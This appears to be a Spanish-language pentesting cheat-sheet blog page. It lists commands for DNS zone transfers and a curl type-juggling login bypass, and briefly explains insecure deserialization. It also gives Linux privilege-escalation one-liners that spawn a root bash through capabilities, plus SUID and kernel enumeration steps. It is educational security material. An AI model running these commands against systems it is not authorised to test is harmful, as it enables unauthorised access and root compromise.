<p><a href="https://www.welivesecurity.com/la-es/2015/06/17/trata-ataque-transferencia-zona-dns/">Domain Zone Transfer</a></p>

<p>Tenemos diferentes programas para realizar el ataque, su sintaxis serían las siguientes:</p>

<ul>
  <li>dnsenum</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dnsenum <span class="nt">--enum</span> <span class="o">{</span>IP<span class="o">}</span>
</code></pre></div></div>

<ul>
  <li>dig</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dig @<span class="o">{</span>IP<span class="o">}</span> <span class="o">{</span>URL<span class="o">}</span> axfr     
</code></pre></div></div>

<h2 id="vulnerabilidades-de-tipo-insecure-deserialization">Vulnerabilidades de tipo Insecure Deserialization</h2>

<p>Para comprender qué es la deserialización insegura, primero debemos comprender qué son la serialización y la deserialización.</p>

<ul>
  <li>
    <p>La serialización se refiere a un proceso de conversión de un objeto a un formato que puede conservarse en el disco (por ejemplo,   guardarse en un archivo o almacén de datos), enviarse a través de secuencias (por ejemplo, stdout) o enviarse a través de una re   d. El formato en el que se serializa un objeto puede ser binario o texto estructurado (por ejemplo, XML, JSON YAML…). JSON y XML   son dos de los formatos de serialización más utilizados dentro de las aplicaciones web.</p>
  </li>
  <li>
    <p>La deserialización, por otro lado, es lo opuesto a la serialización, es decir, transformar datos serializados provenientes de un   archivo, flujo o conector de red en un objeto.</p>
  </li>
</ul>

<p><a href="https://www.acunetix.com/blog/articles/what-is-insecure-deserialization/">Más información</a></p>

<h2 id="vulnerabilidad-type-juggling-sobre-panel-login">Vulnerabilidad Type Juggling sobre panel Login</h2>

<p>Este tipo de vulnerabilidad se da en archivos .php que usan tablas comparativas para logearse, se pede romper con este comando:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-X</span> POST <span class="nt">--data</span> <span class="s2">"usuario=&amp;password[]="</span> <span class="o">{</span>IP/<span class="o">}</span>
</code></pre></div></div>

<h1 id="escala-de-privilegios">Escala de privilegios</h1>

<h2 id="abuso-del-sudoers-para-escalar-privilegios">Abuso del Sudoers para escalar privilegios</h2>

<p>Para escalar privilegios debemos listar los permisos, investigando en <a href="https://gtfobins.github.io/">GTFobins</a> encontramos la manera de acceder como root</p>

<h2 id="abuso-de-permisos-suid-para-escalar-privilegios">Abuso de permisos SUID para escalar privilegios</h2>

<p>Listamos si tenemos privilegios SUID con el comando <code class="language-plaintext highlighter-rouge">find \perm -4000 2&gt;/dev/null</code> y buscamos en la anterior página si hay una vulnerabilidad. 
<a href="https://www.luisguillen.com/posts/2017/12/como-funcionan-permisos-suid/">SUID</a></p>

<h2 id="abuso-de-las-capabilities-para-escalar-privilegios">Abuso de las Capabilities para escalar privilegios</h2>

<p><a href="https://www.incibe-cert.es/blog/linux-capabilities">Capabilities</a></p>

<p>En la anterior página tenemos información sobre la escala de privilegio a traves de las Capabilities, algunos comandos son:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>getcap <span class="nt">-r</span> / 2&gt;/dev/null <span class="c">#Reconocimiento de capas</span>
python3.8 <span class="nt">-c</span> <span class="s1">'import os; os.setuid(0); os.system("/bin/bash")'</span>
php7.3 <span class="nt">-r</span> <span class="s2">"posix_setuid(0); system('/bin/bash');"</span>
</code></pre></div></div>
<h2 id="path-hijacking--library-hijacking">PATH Hijacking / Library Hijacking</h2>

<p>Para escalar privilegios debemos buscar algunas librerias de python que tienen esta vulnerabilidad, como se muestra en la siguiente página
<a href="https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8">Python Hijacking</a></p>

<h2 id="abuso-del-kernel-para-escalar-privilegios">Abuso del Kernel para escalar privilegios</h2>

<p>Para esta escala de privilegios debemos saber la version de kernel de la máquina y buscar una vulnerabilidad ya sea en searchexploit entre otros.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">uname</span> <span class="nt">-a</span>
</code></pre></div></div>

<h1 id="reconocimiento-del-sistema">Reconocimiento del sistema</h1>

<p>Es recomendable hacer un reconocimiento de nuestro sistema, la siguiente herramienta nos ayuda a reconocer el sistema Linux, en cuanto a Windows tenemos winPEAS.</p>

<p><a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">Windows</a></p>

<p><a href="https://github.com/diego-treitos/linux-smart-enumeration">Linux</a></p>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#gu%C3%ADas" class="page__taxonomy-item" rel="tag">Guías</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#herramientas" class="page__taxonomy-item" rel="tag">Herramientas</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#linux" class="page__taxonomy-item" rel="tag">Linux</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#pentesting" class="page__taxonomy-item" rel="tag">Pentesting</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#privilege-escalation" class="page__taxonomy-item" rel="tag">Privilege Escalation</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#vulnerabilidades" class="page__taxonomy-item" rel="tag">Vulnerabilidades</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#windows" class="page__taxonomy-item" rel="tag">Windows</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#exploits" class="page__taxonomy-item" rel="tag">Exploits</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#research" class="page__taxonomy-item" rel="tag">Research</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#utilidades" class="page__taxonomy-item" rel="tag">Utilidades</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#vulnerabilidades" class="page__taxonomy-item" rel="tag">Vulnerabilidades</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2021-10-11T00:00:00-05:00">October 11, 2021</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/Herramientas-de-Hacking/" class="pagination--pager" title="Herramientas de Hacking
">Previous</a>
    
    
      <a href="#" class="pagination--pager disabled">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2022 ARgoN</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>








  </body>
</html>
